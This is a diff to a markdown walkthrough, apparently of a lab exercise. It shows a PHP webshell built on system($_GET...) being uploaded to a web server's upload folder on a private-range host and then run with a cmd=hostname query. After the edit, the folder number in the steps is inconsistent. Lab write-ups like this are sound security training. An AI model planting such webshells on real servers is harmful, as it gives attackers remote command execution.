@@ -93,7 +93,7 @@ Create a simple webshell to run commands through the browser. <?php system($_GET
 
 <img width="900" height="471" alt="Screenshot 2026-04-16 104736" src="https://github.com/user-attachments/assets/b0640db9-b588-4eb1-aaeb-5643cdb240b0" />
 
-Force uploading the files into the new folder of http://10.150.150.11/upload/12 Reason to run the PHP file on the web. http://10.150.150.11/upload/12/shell.php http://10.150.150.11/upload/12/shell.php?cmd=hostname
+Force uploading the files into the new folder of http://10.150.150.11/upload/11 Reason to run the PHP file on the web. http://10.150.150.11/upload/11/shell.php http://10.150.150.11/upload/12/shell.php?cmd=hostname
 
 <img width="782" height="241" alt="Screenshot 2026-04-16 105717" src="https://github.com/user-attachments/assets/b5850a76-87ee-4e6a-8ba2-09eb320e6813" />
 
